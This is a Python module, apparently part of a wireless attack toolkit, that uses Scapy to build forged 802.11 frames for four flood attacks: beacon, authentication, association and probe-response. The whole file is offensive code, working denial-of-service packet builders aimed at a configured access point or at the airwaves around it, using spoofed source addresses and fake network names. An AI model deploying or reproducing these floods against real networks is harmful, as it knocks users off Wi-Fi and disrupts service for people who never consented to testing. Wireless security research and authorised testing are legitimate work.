"""
Flood attack implementations.
"""

import random
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq
from .base_attack import BaseAttack


class BeaconFloodAttack(BaseAttack):
    """Beacon flood attack implementation."""
    
    def _create_packet(self) -> Packet:
        """Create beacon flood packet."""
        # Generate random SSID
        ssid = f"Fake_Network_{random.randint(1000, 9999)}"
        
        # Create beacon packet
        packet = (
            RadioTap() /
            Dot11(
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=self._get_source_mac(),  # Source (attacker)
                addr3=self._get_source_mac()   # BSSID
            ) /
            Dot11Beacon(cap="ESS") /
            Dot11Elt(ID="SSID", info=ssid) /
            Dot11Elt(ID="Rates", info=b"\x82\x84\x0b\x16") /
            Dot11Elt(ID="DSset", info=chr(random.randint(1, 13)))
        )
        
        return packet


class AuthFloodAttack(BaseAttack):
    """Authentication flood attack implementation."""
    
    def _create_packet(self) -> Packet:
        """Create authentication flood packet."""
        if not self._config.target_bssid:
            return None
        
        # Create authentication packet
        packet = (
            RadioTap() /
            Dot11(
                addr1=self._config.target_bssid,  # Destination (AP)
                addr2=self._get_source_mac(),     # Source (attacker)
                addr3=self._config.target_bssid   # BSSID
            ) /
            Dot11Auth(algo=0, seqnum=1, status=0)  # Open system authentication
        )
        
        return packet


class AssocFloodAttack(BaseAttack):
    """Association flood attack implementation."""
    
    def _create_packet(self) -> Packet:
        """Create association flood packet."""
        if not self._config.target_bssid:
            return None
        
        # Create association request packet
        packet = (
            RadioTap() /
            Dot11(
                addr1=self._config.target_bssid,  # Destination (AP)
                addr2=self._get_source_mac(),     # Source (attacker)
                addr3=self._config.target_bssid   # BSSID
            ) /
            Dot11AssoReq(cap="ESS") /
            Dot11Elt(ID="SSID", info=self._config.target_ssid or "Fake_SSID") /
            Dot11Elt(ID="Rates", info=b"\x82\x84\x0b\x16")
        )
        
        return packet


class ProbeResponseFloodAttack(BaseAttack):
    """Probe response flood attack implementation."""
    
    def _create_packet(self) -> Packet:
        """Create probe response flood packet."""
        # Generate random SSID
        ssid = f"Fake_Network_{random.randint(1000, 9999)}"
        
        # Create probe response packet
        packet = (
            RadioTap() /
            Dot11(
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=self._get_source_mac(),  # Source (attacker)
                addr3=self._get_source_mac()   # BSSID
            ) /
            Dot11ProbeResp(cap="ESS") /
            Dot11Elt(ID="SSID", info=ssid) /
            Dot11Elt(ID="Rates", info=b"\x82\x84\x0b\x16") /
            Dot11Elt(ID="DSset", info=chr(random.randint(1, 13)))
        )
        
        return packet 